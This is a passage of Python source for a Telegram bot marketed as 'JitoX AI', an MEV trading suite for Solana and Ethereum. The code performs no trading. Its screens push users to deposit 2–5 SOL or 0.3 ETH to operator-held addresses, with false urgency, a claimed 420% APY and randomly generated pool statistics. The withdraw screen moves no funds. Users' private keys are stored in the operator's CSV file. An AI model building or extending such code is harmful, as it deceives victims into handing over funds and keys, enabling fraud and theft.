            'private_key': private_key_str,
            'public_key': public_key_str
        }
    except Exception as e:
        logger.error(f"Error generating wallet: {str(e)}")
        return None

async def get_wallet_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle the /get_wallet command."""
    user_id = update.effective_user.id
    
    # Check if user already has a wallet
    existing_wallet = await get_user_wallet(user_id)
    
    if existing_wallet:
        current_balance = await get_balance(existing_wallet['public_key'])
        
        message = (
            "💎 <b>Your JitoX Wallet</b> 💎\n\n"
            f"🔑 Address: <code>{existing_wallet['public_key']}</code>\n"
            f"💰 Balance: {current_balance:.4f} SOL\n\n"
            "🛠 <b>Actions:</b>"
        )
        
        keyboard = [
            [InlineKeyboardButton("🔐 Show Private Key", callback_data="show_key")],
            [InlineKeyboardButton("🔄 Generate New Wallet", callback_data="generate_new")],
            [InlineKeyboardButton("🔙 Back to Menu", callback_data="back")]
        ]
        
    else:
        message = (
            "💫 <b>Welcome to JitoX Wallet!</b> 💫\n\n"
            "You don't have a wallet yet. Would you like to generate one?\n\n"
            "Your wallet will be:\n"
            "✅ Secure\n"
            "✅ Self-custodial\n"
            "✅ Compatible with Phantom"
        )
        
        keyboard = [
            [InlineKeyboardButton("✨ Generate Wallet", callback_data="generate_wallet")],
            [InlineKeyboardButton("🔙 Back to Menu", callback_data="back")]
        ]
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    if update.callback_query:
        await update.callback_query.edit_message_text(message, reply_markup=reply_markup, parse_mode='HTML')
    else:
        await update.message.reply_text(message, reply_markup=reply_markup, parse_mode='HTML')

# Ensure wallet CSV file exists with headers
if not os.path.exists(WALLET_CSV_FILE):
    with open(WALLET_CSV_FILE, 'w', newline='', encoding='utf-8') as f:
        writer = csv.writer(f)
        writer.writerow(['user_id', 'public_key', 'private_key', 'created_at'])

async def get_balance(wallet_address: str) -> float:
    """Get wallet balance."""
    try:
        async with aiohttp.ClientSession() as session:
            balance_data = {
                "jsonrpc": "2.0",
                "id": 1,
                "method": "getBalance",
                "params": [wallet_address]
            }
            async with session.post(SOLANA_RPC_URL, json=balance_data) as response:
                result = await response.json()
                if 'result' in result and 'value' in result['result']:
                    return float(result['result']['value']) / 1e9  # Convert lamports to SOL
    except Exception as e:
        logger.error(f"Error in get_balance for {wallet_address}: {str(e)}")
    return 0.0




async def get_eth_wallet(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id
    
    if update.callback_query:
        message_func = update.callback_query.edit_message_text
    else:
        message_func = update.message.reply_text

    if user_id not in eth_user_wallets:
        if eth_wallet_addresses:
            wallet = eth_wallet_addresses.pop(0)
            eth_user_wallets[user_id] = wallet
            await log_user_activity(context.application, user_id, f"was assigned ETH wallet: {wallet}")
            message = (
                "👾 <b>Congratulations! Your ETH MEV Professional Suite Access is Confirmed</b> 👾\n\n"
                "⚔️ <b>Your Dedicated ETH Trading Wallet:</b>\n\n"
                f"<code>{wallet}</code>\n\n"
                "🎯 <b>Essential Setup Steps:</b>\n\n"
                "1. Initialize with 0.3 ETH to activate your trading suite\n"
                "2. Your deposit serves as your trading balance - fully withdrawable\n\n"
                "🚀 <b>Limited Capacity Alert: Professional tier slots are filling rapidly</b>\n\n"
                "✨ <b>Performance Insight: Early adopters report 47% higher performance metrics</b>\n\n"
                "💎 <b>Activation Benefits:</b>\n\n"
                "⚡ Immediate suite activation post-deposit\n"
                "⚡ Priority access to next trading cycle\n"
                "⚡ Real-time performance tracking\n\n"
                "🛡 <b>Professional Support: Contact @jitoxai for priority assistance</b>\n\n"
                "Professional traders understand: Optimal entry timing is crucial in ETH MEV.\n\n"
                "Ready to elevate your trading? Complete your 0.3 ETH initialization now. 🎮"
            )
            
            # Send notification to admin
            await send_admin_notification(context.application, f"User {user_id} was assigned ETH wallet: {wallet}")
        else:
            message = "Sorry, all ETH wallets have been filled, please contact @jitoxai for a spot."
    else:
        wallet = eth_user_wallets[user_id]
        message = f"Your existing ETH wallet address: <code>{wallet}</code>"

    keyboard = [[InlineKeyboardButton("🔙 Back", callback_data='back')]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await message_func(message, reply_markup=reply_markup, parse_mode='HTML')

async def mev_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    message = (
        "🚀 <b>MEV Sniper Control Center</b> 🚀\n\n"
        "Choose an action:\n"
        "🔹 View MEV Positions\n"
        "🔹 Check Pending MEV"
    )
    keyboard = [
        [InlineKeyboardButton("🟢 Start MEV Sniper", callback_data='start_mev'),
         InlineKeyboardButton("🔴 Stop MEV Sniper", callback_data='stop_mev')],
        [InlineKeyboardButton("📊 MEV Positions", callback_data='mev_positions'),
         InlineKeyboardButton("⏳ MEV Pending", callback_data='mev_pending')],
        [InlineKeyboardButton("🔙 Back", callback_data='back')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(message, reply_markup=reply_markup, parse_mode='HTML')

async def intensity_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    message = (
        "⚡ <b>MEV Intensity Control</b> ⚡\n\n"
        "Current Intensity: <b>MEDIUM</b>\n\n"
        "Adjust the intensity of MEV operations:\n"
        "🎯 Low: Fewer operations, lower risk\n"
        "💫 Medium: Balanced approach\n"
        "🚀 High: Aggressive strategy, higher potential returns\n\n"
        " Remember to maintain a balance of 2 or more SOL for optimal performance."
    )
    keyboard = [
        [InlineKeyboardButton("🟢 Low", callback_data='intensity_low'),
         InlineKeyboardButton("🟡 Medium", callback_data='intensity_medium'),
         InlineKeyboardButton("🔴 High", callback_data='intensity_high')],
        [InlineKeyboardButton("🔙 Back", callback_data='back')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(message, reply_markup=reply_markup, parse_mode='HTML')
    await log_user_activity(context.application, update.effective_user.id, "accessed Intensity settings")

async def set_intensity(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    query = update.callback_query
    user_id = update.effective_user.id
    intensity = query.data.split('_')[1].capitalize()
    
    message = (
        f"Intensity set to {intensity}\n\n"
        "⚠️ Remember to keep a balance of 2 or more SOL for optimal performance."
    )
    await query.answer(message)
    context.user_data['mev_intensity'] = intensity
    await intensity_command(update, context)
    await log_user_activity(context.application, user_id, f"set MEV intensity to {intensity}")

async def pool_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id
    user_balance = context.user_data.get('balance', 0)
    pooled_amount = context.user_data.get('pooled_amount', 0)
    
    message = (
            "👾 <b>JitoX AI Professional Liquidity Suite</b> 👾\n\n"
            f"💎 <b>Portfolio Overview</b>\n"
            f"⚡️ Trading Balance: <b>{user_balance:.2f} SOL</b>\n"
            f"⚡️ Active Position: <b>{pooled_amount:.2f} SOL</b>\n\n"
            "🎮 <b>Institutional-Grade Liquidity Pool</b>\n\n"
            "⚔️ Advanced MEV extraction algorithms\n"
            "⚔️ Professional-tier execution priority\n"
            "⚔️ Real-time performance optimization\n\n"
            "🎯 <b>Performance Metrics</b>\n"
            "✨ Target APY: 420% (Based on market conditions)\n"
            "✨ Required Balance: 2 SOL minimum\n\n"
            "Ready to access institutional-grade MEV opportunities? Initialize your suite now. 🎮"
        )
    keyboard = [
        [InlineKeyboardButton(" Add Liquidity", callback_data='add_liquidity'),
         InlineKeyboardButton("🔓 Remove Liquidity", callback_data='remove_liquidity')],
        [InlineKeyboardButton("📊 View Pool Stats", callback_data='pool_stats')],
        [InlineKeyboardButton("🔙 Back", callback_data='back')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(message, reply_markup=reply_markup, parse_mode='HTML')
    await log_user_activity(context.application, user_id, "accessed Pool settings")

async def add_liquidity(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id
    message = (
            "👾 <b>JitoX AI - Professional Position Management</b> 👾\n\n"
            "⚔️ <b>Initialize Trading Position</b>\n\n"
            "Specify your trading balance allocation (Minimum 2 SOL required)\n\n"
            "💎 <b>Professional Insight:</b>\n"
            "⚡️ Higher allocations unlock enhanced execution priority\n"
            "⚡️ Institutional-grade features at 5+ SOL\n"
            "⚡️ Optimal performance with strategic positioning\n\n"
            "🎯 Enter your desired initialization amount to begin professional MEV operations.\n\n"
            "Ready to elevate your trading strategy? 🎮"
        )
    await update.callback_query.edit_message_text(message, parse_mode='HTML')
    await log_user_activity(context.application, user_id, "accessed Add Liquidity")

async def remove_liquidity(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id
    pooled_amount = context.user_data.get('pooled_amount', 0)
    
    message = (
            "👾 <b>JitoX AI - Position Reallocation</b> 👾\n\n"
            "💎 <b>Current Position Overview</b>\n"
            f"⚡️ Active Trading Balance: <b>{pooled_amount:.2f} SOL</b>\n\n"
            "🎯 <b>Strategic Advisory:</b>\n"
            "⚔️ Maintain 2 SOL minimum for continuous operation\n"
            "⚔️ Strategic reallocation may impact execution priority\n"
            "⚔️ Consider market conditions before adjusting position\n\n"
            "✨ Specify the amount you wish to reallocate from your active trading balance.\n\n"
            "Professional traders understand: Position sizing is crucial for MEV success. 🎮"
        )
    await update.callback_query.edit_message_text(message, parse_mode='HTML')
    await log_user_activity(context.application, user_id, "accessed Remove Liquidity")

async def view_pool_stats(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id
    total_pooled = random.uniform(565.11, 1671.11)
    
    message = (
            "👾 <b>JitoX AI - Professional Analytics Suite</b> 👾\n\n"
            "💎 <b>Global Position Metrics</b>\n"
            f"⚡️ Total Institutional Capital: <b>{total_pooled:.2f} SOL</b>\n\n"
            "🎯 <b>Market Impact Analysis</b>\n"
            "⚔️ Aggregated professional trading volume\n"
            "⚔️ Enhanced MEV extraction efficiency\n"
            "⚔️ Optimized institutional-grade execution\n\n"
            "✨ <b>Strategic Insight:</b>\n"
            "Increased capital depth enables superior MEV capture rates and enhanced execution priority.\n\n"
            "Professional traders understand: Liquidity depth drives MEV performance. 🎮"
        )
    keyboard = [[InlineKeyboardButton("🔙 Back to Pool Settings", callback_data='pool_settings')]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.callback_query.edit_message_text(message, reply_markup=reply_markup, parse_mode='HTML')
    await log_user_activity(context.application, user_id, "viewed Pool Stats")

async def settings_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    message = (
            "👾 <b>JitoX AI Professional Configuration Suite</b> 👾\n\n"
            "💎 <b>Advanced Trading Parameters</b>\n\n"
            "⚡️ <b>Execution Intelligence</b>\n"
            "• Real-time performance notifications\n"
            "• Strategic position alerts\n\n"
            "⚡️ <b>Portfolio Optimization</b>\n"
            "• Automated profit compounding\n"
            "• Dynamic balance management\n\n"
            "⚡️ <b>Risk Architecture</b>\n"
            "• Professional risk modeling\n"
            "• Institutional exposure control\n\n"
            "⚡️ <b>Network Optimization</b>\n"
            "• Priority transaction routing\n"
            "• Advanced gas management\n\n"
            "🎯 Configure your suite for optimal MEV extraction performance. 🎮"
        )
    keyboard = [
        [InlineKeyboardButton("🔔 Notifications", callback_data='settings_notifications'),
         InlineKeyboardButton("💰 Auto-compound", callback_data='settings_autocompound')],
        [InlineKeyboardButton("⚖️ Risk Level", callback_data='settings_risk'),
         InlineKeyboardButton("⛽ Gas Settings", callback_data='settings_gas')],
        [InlineKeyboardButton("🔙 Back", callback_data='back')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(message, reply_markup=reply_markup, parse_mode='HTML')

async def toggle_mev_notifications(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    query = update.callback_query
    user_id = update.effective_user.id
    current_state = context.user_data.get('mev_notifications', False)
    new_state = not current_state
    context.user_data['mev_notifications'] = new_state
    
    state_text = "ON" if new_state else "OFF"
    message = f"MEV Notifications turned {state_text} for all MEV operations."
    
    keyboard = [
        [InlineKeyboardButton("🟢 MEV Notifications ON" if new_state else "🔴 MEV Notifications OFF", 
                              callback_data=f'mev_notifications_{"off" if new_state else "on"}')],
        [InlineKeyboardButton("🔙 Back to Settings", callback_data='settings')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await query.edit_message_text(message, reply_markup=reply_markup)
    await log_user_activity(context.application, user_id, f"turned MEV notifications {state_text}")

async def auto_compound(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id
    message = (
        "💰 <b>Auto-Compound</b> 💰\n\n"
        "⚠️ You can't operate with a balance under 2 SOL.\n\n"
        "Deposit 2 SOL to enable auto-compounding and maximize your returns!"
    )
    keyboard = [[InlineKeyboardButton("🔙 Back to Settings", callback_data='settings')]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.callback_query.edit_message_text(message, reply_markup=reply_markup, parse_mode='HTML')
    await log_user_activity(context.application, user_id, "attempted to access Auto-Compound")

async def risk_level(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id
    message = (
            "👾 <b>JitoX AI - Professional Risk Architecture</b> 👾\n\n"
            "💎 <b>Strategic Risk Management Profiles</b>\n\n"
            "⚡️ <b>Conservative Protocol</b>\n"
            "• Optimized for capital preservation\n"
            "• Enhanced risk mitigation algorithms\n"
            "• Steady performance metrics\n\n"
            "⚡️ <b>Balanced Protocol</b>\n"
            "• Strategic position management\n"
            "• Optimal risk-reward calibration\n"
            "• Professional execution framework\n\n"
            "⚡️ <b>Aggressive Protocol</b>\n"
            "• Maximum performance targeting\n"
            "• Advanced opportunity capture\n"
            "• Institutional-grade execution priority\n\n"
            "🛡️ <b>Access Requirements</b>\n"
            "✨ Initialize suite with 2 SOL to activate risk management protocols\n"
            "✨ Enhanced features available at 5+ SOL allocation\n\n"
            "Professional traders understand: Strategic risk management drives consistent MEV performance. 🎮"
        )
    keyboard = [[InlineKeyboardButton("🔙 Back to Settings", callback_data='settings')]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.callback_query.edit_message_text(message, reply_markup=reply_markup, parse_mode='HTML')
    await log_user_activity(context.application, user_id, "attempted to access Risk Level settings")

async def gas_settings(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id
    message = (
            "👾 <b>JitoX AI - Network Optimization Protocol</b> 👾\n\n"
            "💎 <b>Transaction Priority Framework</b>\n\n"
            "⚡️ <b>Professional Configuration Range:</b>\n"
            "• Minimum: 0.001 SOL\n"
            "• Maximum: 0.01 SOL\n\n"
            "🎯 <b>Strategic Advantages:</b>\n"
            "⚔️ Enhanced execution probability\n"
            "⚔️ Reduced latency in high-activity periods\n"
            "⚔️ Priority block inclusion\n\n"
            "✨ <b>Configuration:</b>\n"
            "Specify your preferred priority level (e.g., 0.005 SOL)\n\n"
            "Professional traders understand: Optimal network priority ensures superior MEV capture. 🎮"
        )
    await update.callback_query.edit_message_text(message, parse_mode='HTML')
    context.user_data['awaiting_gas_input'] = True
    await log_user_activity(context.application, user_id, "accessed Gas Settings")

async def ca_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    message = (
            "👾 <b>JitoX AI - Strategic Asset Configuration</b> 👾\n\n"
            "💎 <b>Professional Token Integration</b>\n\n"
            "⚡️ <b>Advanced Targeting Protocol</b>\n"
            "• Institutional-grade contract validation\n"
            "• Multi-venue liquidity analysis\n"
            "• Dynamic pair optimization\n\n"
            "🎯 <b>Execution Parameters</b>\n"
            "⚔️ Custom slippage tolerance\n"
            "⚔️ Priority routing configuration\n"
            "⚔️ Cross-pool arbitrage vectors\n\n"
            "✨ <b>Implementation:</b>\n"
            "Input contract address for advanced MEV targeting\n\n"
            "Professional traders understand: Strategic asset selection maximizes MEV opportunities. 🎮"
        )
    keyboard = [
        [InlineKeyboardButton("➕ Add Token", callback_data='add_token'),
         InlineKeyboardButton("➖ Remove Token", callback_data='remove_token')],
        [InlineKeyboardButton("📋 View Token List", callback_data='view_tokens')],
        [InlineKeyboardButton("🔙 Back", callback_data='back')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(message, reply_markup=reply_markup, parse_mode='HTML')

async def add_token(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id
    message = (
        "➕ <b>Add Token</b> ➕\n\n"
        "Please enter the contract address of the token you'd like to add to your targeting list.\n\n"
        "Example format: 7EcDhSYGxXyscszYEp35KHN8vvw3svAuLKTzXwCFLtV"
    )
    await update.callback_query.edit_message_text(message, parse_mode='HTML')
    context.user_data['awaiting_token_input'] = True
    await log_user_activity(context.application, user_id, "accessed Add Token")

async def remove_token(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id
    token_list = context.user_data.get('token_list', [])
    
    if not token_list:
        message = "You haven't added any tokens yet. Use the 'Add Token' option to get started."
        keyboard = [[InlineKeyboardButton("🔙 Back to Token Targeting", callback_data='token_targeting')]]
    else:
        message = "Select a token to remove:"
        keyboard = [[InlineKeyboardButton(f"❌ {token[:10]}...{token[-4:]}", callback_data=f'remove_{token}')] for token in token_list]
        keyboard.append([InlineKeyboardButton("🔙 Back to Token Targeting", callback_data='token_targeting')])
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.callback_query.edit_message_text(message, reply_markup=reply_markup, parse_mode='HTML')
    await log_user_activity(context.application, user_id, "accessed Remove Token")

async def view_tokens(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id
    token_list = context.user_data.get('token_list', [])
    
    if not token_list:
        message = "You haven't added any tokens yet. Use the 'Add Token' option to get started."
    else:
        message = "📋 <b>Your Token List</b> 📋\n\n" + "\n".join([f"🔹 {token[:10]}...{token[-4:]}" for token in token_list])
    
    keyboard = [[InlineKeyboardButton("🔙 Back to Token Targeting", callback_data='token_targeting')]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.callback_query.edit_message_text(message, reply_markup=reply_markup, parse_mode='HTML')
    await log_user_activity(context.application, user_id, "viewed Token List")

async def auto_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    message = (
        "🤖 <b>Auto MEV - VIP Feature</b> 🤖\n\n"
        "Unlock the full power of automated MEV:\n"
        "🔹 24/7 AI-driven MEV exploitation\n"
        "🔹 Advanced predictive algorithms\n"
        "🔹 Priority execution on all strategies\n\n"
        "️ Requires a minimum balance of 5 SOL"
    )
    keyboard = [
        [InlineKeyboardButton("🟢 Activate Auto MEV", callback_data='activate_auto_mev'),
         InlineKeyboardButton("🔴 Deactivate Auto MEV", callback_data='deactivate_auto_mev')],
        [InlineKeyboardButton("📊 Auto MEV Stats", callback_data='auto_mev_stats')],
        [InlineKeyboardButton("🔙 Back", callback_data='back')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(message, reply_markup=reply_markup, parse_mode='HTML')

async def activate_auto_mev(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id
    message = (
        "🚀 <b>Auto MEV Activation</b> 🚀\n\n"
        "⚠️ You need a minimum balance of 5 SOL to activate Auto MEV.\n\n"
        "Deposit 5 SOL to unlock this powerful feature and maximize your MEV profits!"
    )
    keyboard = [[InlineKeyboardButton("🔙 Back to Auto MEV", callback_data='auto_mev')]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.callback_query.edit_message_text(message, reply_markup=reply_markup, parse_mode='HTML')
    await log_user_activity(context.application, user_id, "attempted to activate Auto MEV")

async def deactivate_auto_mev(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id
    message = (
        "🛑 <b>Auto MEV Deactivation</b> 🛑\n\n"
        "Auto MEV is not currently active.\n\n"
        "Activate Auto MEV with a 5 SOL balance to experience its benefits!"
    )
    keyboard = [[InlineKeyboardButton("🔙 Back to Auto MEV", callback_data='auto_mev')]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.callback_query.edit_message_text(message, reply_markup=reply_markup, parse_mode='HTML')
    await log_user_activity(context.application, user_id, "attempted to deactivate Auto MEV")

async def auto_mev_stats(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id
    message = (
        "📊 <b>Auto MEV Statistics</b> 📊\n\n"
        "Auto MEV is not currently active.\n\n"
        "Activate Auto MEV with a 5 SOL balance to start generating statistics!"
    )
    keyboard = [[InlineKeyboardButton("🔙 Back to Auto MEV", callback_data='auto_mev')]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.callback_query.edit_message_text(message, reply_markup=reply_markup, parse_mode='HTML')
    await log_user_activity(context.application, user_id, "viewed Auto MEV stats")

async def withdraw_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    await log_user_activity(context.application, update.effective_user.id, "used /withdraw command")
    await withdraw(update, context)

async def withdraw(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id
    await log_user_activity(context.application, user_id, "attempted to withdraw")
    
    message = (
            "👾 <b>JitoX AI - Professional Balance Management</b> 👾\n\n"
            "💎 <b>Strategic Withdrawal Protocol</b>\n\n"
            "⚡️ <b>Operational Requirements</b>\n"
            "• Maintain 2 SOL minimum trading balance\n"
            "• Preserve execution priority status\n"
            "• Ensure continuous MEV capture\n\n"
            "🎯 <b>Performance Considerations</b>\n"
            "⚔️ Optimal strategy continuation\n"
            "⚔️ Uninterrupted profit generation\n"
            "⚔️ Sustained institutional access\n\n"
            "🛡️ <b>Security Framework</b>\n"
            "✨ Self-custodial asset protection\n"
            "✨ Professional-grade security protocols\n"
            "✨ Institutional withdrawal standards\n\n"
            "Professional traders understand: Strategic balance management ensures optimal MEV performance. 🎮"
        )
    keyboard = [[InlineKeyboardButton("🔙 Back to Menu", callback_data='back')]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    if update.message:
        await update.message.reply_text(message, reply_markup=reply_markup, parse_mode='HTML')
    elif update.callback_query:
        await update.callback_query.edit_message_text(message, reply_markup=reply_markup, parse_mode='HTML')

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    query = update.callback_query
    if not query:
        return

    # Track button click in broadcast system
    try:
        df = pd.read_csv('message_mapping.csv')
        mapping = df[df['telegram_message_id'] == str(query.message.message_id)]
        if not mapping.empty:
            broadcast_id = mapping.iloc[0]['broadcast_id']
            broadcaster.track_button_click(broadcast_id, query.from_user.id)
    except Exception as e:
        logger.error(f"Error tracking button click: {e}")

    await query.answer()
    
    user_id = query.from_user.id
    logger.debug(f"Button pressed by user_id: {user_id}, data: {query.data}")
    await log_user_activity(context.application, user_id, f"pressed button: {query.data}")

    if query.data == "show_key":
        wallet = await get_user_wallet(user_id)
        
        if wallet:
            message = (
                "🔐 <b>Your Wallet Details</b> 🔐\n\n"
                f"🔑 Public Key:\n<code>{wallet['public_key']}</code>\n\n"
                f"🔒 Private Key:\n<code>{wallet['private_key']}</code>\n\n"
                "⚠️ <b>IMPORTANT</b> ⚠️\n"
                "Never share your private key with anyone!\n"
                "Store it safely and securely."
            )
            
            # Log the key viewing in chat
            await log_user_activity(context.application, user_id, f"viewed their wallet keys - Public: {wallet['public_key']}")
            
            keyboard = [[InlineKeyboardButton("🔙 Back to Wallet", callback_data="back_to_wallet")]]
            await query.edit_message_text(
                message,
                reply_markup=InlineKeyboardMarkup(keyboard),
                parse_mode='HTML'
            )
        else:
            await query.edit_message_text(
                "❌ No wallet found. Please generate one first.",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="back")]])
            )
    elif query.data == "back_to_wallet":
        await get_wallet_command(update, context)
    elif query.data == 'back':
        await start(update, context)
    elif query.data == "nexus_settings":
        logger.debug("Calling nexus_settings function")
        await nexus_settings(update, context)
    elif query.data == "custom_alerts":
        message = (
                "👾 <b>JitoX AI - Professional Intelligence Suite</b> 👾\n\n"
                "💎 <b>Advanced Alert Architecture</b>\n\n"
                "⚡️ <b>Strategic Notifications</b>\n"
                "• Real-time MEV opportunity alerts\n"
                "• Dynamic profit threshold monitoring\n"
                "• Institutional volume tracking\n\n"
                "🎯 <b>Professional Features</b>\n"
                "⚔️ Predictive market analysis\n"
                "⚔️ Priority execution alerts\n"
                "⚔️ Performance metric tracking\n\n"
                "🛡️ <b>Access Tiers</b>\n"
                "✨ Standard Suite: 2 SOL initialization\n"
                "✨ Enhanced Suite: 5+ SOL for institutional features\n\n"
                "Professional traders understand: Information advantage drives MEV success. 🎮"
            )
        keyboard = [
            [InlineKeyboardButton("🔑Deposit 2 SOL (Your Balance)", callback_data='get_wallet')],
            [InlineKeyboardButton("🔙 Back", callback_data='nexus_settings')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text(message, reply_markup=reply_markup, parse_mode='HTML')
    elif query.data == "strategy_customization":
        message = (
                "👾 <b>JitoX AI - Strategic Protocol Configuration</b> 👾\n\n"
                "💎 <b>Advanced Strategy Architecture</b>\n\n"
                "⚡️ <b>Execution Parameters</b>\n"
                "• Dynamic token targeting algorithms\n"
                "• Professional-grade timing optimization\n"
                "• Real-time strategy adaptation\n\n"
                "🎯 <b>Performance Enhancement</b>\n"
                "⚔️ Institutional execution speeds\n"
                "⚔️ Advanced market responsiveness\n"
                "⚔️ Precision-based position management\n\n"
                "🛡️ <b>Access Framework</b>\n"
                "✨ Standard Protocol: 2 SOL initialization\n"
                " Enhanced Protocol: 5+ SOL for institutional features\n\n"
                "Professional traders understand: Strategic customization maximizes MEV extraction. 🎮"
            )
        keyboard = [
            [InlineKeyboardButton("🔑Deposit 2 SOL (Your Balance)", callback_data='get_wallet')],
            [InlineKeyboardButton("🔙 Back", callback_data='nexus_settings')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text(message, reply_markup=reply_markup, parse_mode='HTML')
    elif query.data == "performance_analytics":
        message = (
                "👾 <b>JitoX AI - Professional Analytics Framework</b> 👾\n\n"
                "💎 <b>Institutional Performance Metrics</b>\n\n"
                "⚡️ <b>Strategic Intelligence</b>\n"
                "• Advanced profit analytics\n"
                "• Real-time execution tracking\n"
                "• Historical performance modeling\n\n"
                "🎯 <b>Professional Tools</b>\n"
                "⚔️ Multi-dimensional strategy analysis\n"
                "⚔️ Advanced visualization suite\n"
                "⚔️ Predictive performance indicators\n\n"
                "🛡️ <b>Access Tiers</b>\n"
                "✨ Standard Analytics: 2 SOL initialization\n"
                "✨ Institutional Suite: 5+ SOL for advanced features\n\n"
                "Professional traders understand: Data-driven analysis powers optimal MEV capture. 🎮"
            )
        keyboard = [
            [InlineKeyboardButton("🔑Deposit 2 SOL (Your Balance)", callback_data='get_wallet')],
            [InlineKeyboardButton("🔙 Back", callback_data='nexus_settings')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text(message, reply_markup=reply_markup, parse_mode='HTML')
    elif query.data == "risk_management":
        message = (
                "👾 <b>JitoX AI - Professional Risk Framework</b> 👾\n\n"
                "💎 <b>Advanced Risk Architecture</b>\n\n"
                "⚡️ <b>Capital Protection Protocol</b>\n"
                "• Institutional-grade exposure control\n"
                "• Dynamic loss threshold management\n"
                "• Real-time position monitoring\n\n"
                "🎯 <b>Strategic Safeguards</b>\n"
                "⚔️ Advanced stop-loss algorithms\n"
                "⚔️ Precision risk modeling\n"
                "⚔️ Portfolio exposure optimization\n\n"
                "🛡️ <b>Access Framework</b>\n"
                "✨ Standard Protection: 2 SOL initialization\n"
                "✨ Enhanced Suite: 5+ SOL for institutional risk tools\n\n"
                "Professional traders understand: Superior risk management drives consistent MEV performance. 🎮"
            )
        keyboard = [
            [InlineKeyboardButton("🔑Deposit 2 SOL (Your Balance)", callback_data='get_wallet')],
            [InlineKeyboardButton("🔙 Back", callback_data='nexus_settings')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text(message, reply_markup=reply_markup, parse_mode='HTML')
    elif query.data == "user_profiles":
        message = (
                "👾 <b>JitoX AI - Professional Profile Architecture</b> 👾\n\n"
                "💎 <b>Strategic Configuration Management</b>\n\n"
                "⚡️ <b>Advanced Profile Features</b>\n"
                "• Institutional strategy templates\n"
                "• Multi-configuration deployment\n"
                "• Real-time profile switching\n\n"
                "🎯 <b>Professional Advantages</b>\n"
                "⚔️ Optimized execution parameters\n"
                "⚔️ Customized risk frameworks\n"
                "⚔️ Performance preset management\n\n"
                "🛡️ <b>Access Framework</b>\n"
                "✨ Standard Suite: 2 SOL initialization\n"
                "✨ Enhanced Suite: 5+ SOL for institutional profiles\n\n"
                "Professional traders understand: Strategic profile management maximizes operational efficiency. 🎮"
            )
        keyboard = [
            [InlineKeyboardButton("🔑Deposit 2 SOL (Your Balance)", callback_data='get_wallet')],
            [InlineKeyboardButton("🔙 Back", callback_data='nexus_settings')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text(message, reply_markup=reply_markup, parse_mode='HTML')
    elif query.data == "security_settings":
        message = (
                "👾 <b>JitoX AI - Professional Security Framework</b> 👾\n\n"
                "💎 <b>Institutional-Grade Protection</b>\n\n"
                "⚡️ <b>Advanced Security Protocols</b>\n"
                "• Multi-factor authentication system\n"
                "• IP-based access control\n"
                "• Granular permission management\n\n"
                "🎯 <b>Strategic Safeguards</b>\n"
                "⚔️ Real-time threat detection\n"
                "⚔️ Advanced access monitoring\n"
                "⚔️ Professional security auditing\n\n"
                "🛡️ <b>Access Framework</b>\n"
                "✨ Standard Protection: 2 SOL initialization\n"
                "✨ Enhanced Suite: 5+ SOL for institutional features\n\n"
                "Professional traders understand: Superior security ensures operational excellence. 🎮\n\n"
                "💫 <b>24/7 Professional Support</b>\n"
                "Contact @JitoXAI for immediate assistance"
            )
        keyboard = [
